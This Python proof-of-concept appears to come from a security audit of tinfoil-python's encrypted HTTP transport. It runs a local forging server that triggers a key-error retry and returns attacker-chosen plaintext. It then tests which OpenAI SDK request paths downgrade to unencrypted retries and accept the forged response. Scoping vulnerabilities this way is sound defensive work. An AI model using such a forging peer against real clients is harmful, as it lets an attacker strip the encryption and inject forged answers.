"""Bound the reach of the retry downgrade: drive the real OpenAI Python SDK
through tinfoil-python's _EHBPReVerifyingTransport against the same forging
peer. Expectation: the SDK's own bodies (JSON, multipart with a seekable
file) are replayable, so the retry is re-encrypted and the forged plaintext
200 is rejected; only one-shot `content=` bodies downgrade.

Run: ../pyenv-shipped/bin/python -I poc_retry_openai_sdk_paths.py
"""
from __future__ import annotations

import io
import json
import os
import tempfile
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import httpx
import openai
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey
from ehbp import EHBPTransport
from tinfoil.client import _EHBPReVerifyingTransport

LOG: list[dict] = []
KEYCONFIG_422 = json.dumps({"type": "urn:ietf:params:ehbp:error:key-config", "title": "stale key"}).encode()
FORGED_CHAT = json.dumps({"id": "forged", "object": "chat.completion", "created": 1, "model": "m", "choices": [
    {"index": 0, "message": {"role": "assistant", "content": "ATTACKER-CHOSEN ANSWER"}, "finish_reason": "stop"}]}).encode()
FORGED_TRANSCRIPT = json.dumps({"text": "ATTACKER-CHOSEN TRANSCRIPT"}).encode()


class Peer(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_POST(self):
        body = b""
        if self.headers.get("Transfer-Encoding", "").lower() == "chunked":
            while True:
                size = int(self.rfile.readline().strip().split(b";")[0] or b"0", 16)
                if size == 0:
                    self.rfile.readline()
                    break
                body += self.rfile.read(size)
                self.rfile.readline()
        else:
            body = self.rfile.read(int(self.headers.get("Content-Length") or 0))
        entry = {"n": len(LOG) + 1, "path": self.path, "has_ehbp_header": "Ehbp-Encapsulated-Key" in self.headers,
                 "body_len": len(body)}
        LOG.append(entry)
        if entry["n"] == 1:
            self.send_response(422)
            self.send_header("Content-Type", "application/problem+json")
            self.send_header("Content-Length", str(len(KEYCONFIG_422)))
            self.end_headers()
            self.wfile.write(KEYCONFIG_422)
            return
        forged = FORGED_TRANSCRIPT if "audio" in self.path else FORGED_CHAT
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(forged)))
        self.end_headers()
        self.wfile.write(forged)


class StubSecureClient:
    def __init__(self, pub_hex):
        self.pub_hex = pub_hex

    def _build_ehbp_sync_transport(self):
        return EHBPTransport.from_public_key_hex(self.pub_hex, inner=httpx.HTTPTransport())


def start_peer():
    srv = ThreadingHTTPServer(("127.0.0.1", 0), Peer)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, f"http://127.0.0.1:{srv.server_address[1]}"


def report(label, fn):
    LOG.clear()
    srv, url = start_peer()
    fn = (lambda fn=fn: fn(url))
    try:
        out = f"returned {fn()!r}"
    except Exception as e:  # noqa: BLE001
        out = f"raised {type(e).__name__}: {str(e)[:100]}"
    print(f"\n=== {label} ===")
    for e in LOG:
        print("  peer saw", e)
    print("  outcome:", out)
    srv.shutdown()
    last = LOG[-1] if LOG else None
    if last and last["n"] == 2 and not last["has_ehbp_header"] and last["body_len"] == 0 and "ATTACKER" in out:
        print("  VULNERABLE (downgraded to bodyless plaintext; forged response accepted)")
    elif last and last["n"] == 2 and last["has_ehbp_header"]:
        print("  OK (retry re-encrypted; forged nonce-less 200 rejected)")


def main():
    k = X25519PrivateKey.generate()
    pub_hex = k.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw).hex()
    def make_client(url):
        secure = StubSecureClient(pub_hex)
        transport = _EHBPReVerifyingTransport(secure, secure._build_ehbp_sync_transport())
        http_client = httpx.Client(transport=transport, follow_redirects=False)
        return openai.OpenAI(api_key="tinfoil-test-key", base_url=url + "/v1", http_client=http_client, max_retries=0)

    report("OpenAI SDK chat.completions.create (JSON body)", lambda url: make_client(url).chat.completions.create(
        model="m", messages=[{"role": "user", "content": "CONFIDENTIAL"}]).choices[0].message.content)

    wav = tempfile.NamedTemporaryFile(suffix=".wav", delete=False)
    wav.write(b"RIFF" + b"\x00" * 64)
    wav.close()
    report("OpenAI SDK audio.transcriptions.create(file=open(...)) (multipart, seekable file)",
           lambda url: make_client(url).audio.transcriptions.create(model="m", file=open(wav.name, "rb")).text)

    r, w = os.pipe()
    os.write(w, b"RIFF" + b"\x00" * 64)
    os.close(w)
    pipe = os.fdopen(r, "rb", buffering=0)
    report("OpenAI SDK audio.transcriptions.create(file=<pipe>) (multipart, NON-seekable file)",
           lambda url: make_client(url).audio.transcriptions.create(model="m", file=("a.wav", pipe)).text)

    # The documented general-purpose client surface: SecureClient.make_secure_http_client().
    def raw_post(url):
        secure = StubSecureClient(pub_hex)
        transport = _EHBPReVerifyingTransport(secure, secure._build_ehbp_sync_transport())
        c = httpx.Client(transport=transport, follow_redirects=False)
        return c.post(url + "/v1/chat/completions", headers={"Authorization": "Bearer k"},
                      content=io.BytesIO(b'{"model":"m","messages":[]}')).text
    report("make_secure_http_client().post(content=BytesIO) (one-shot body)", raw_post)


if __name__ == "__main__":
    main()
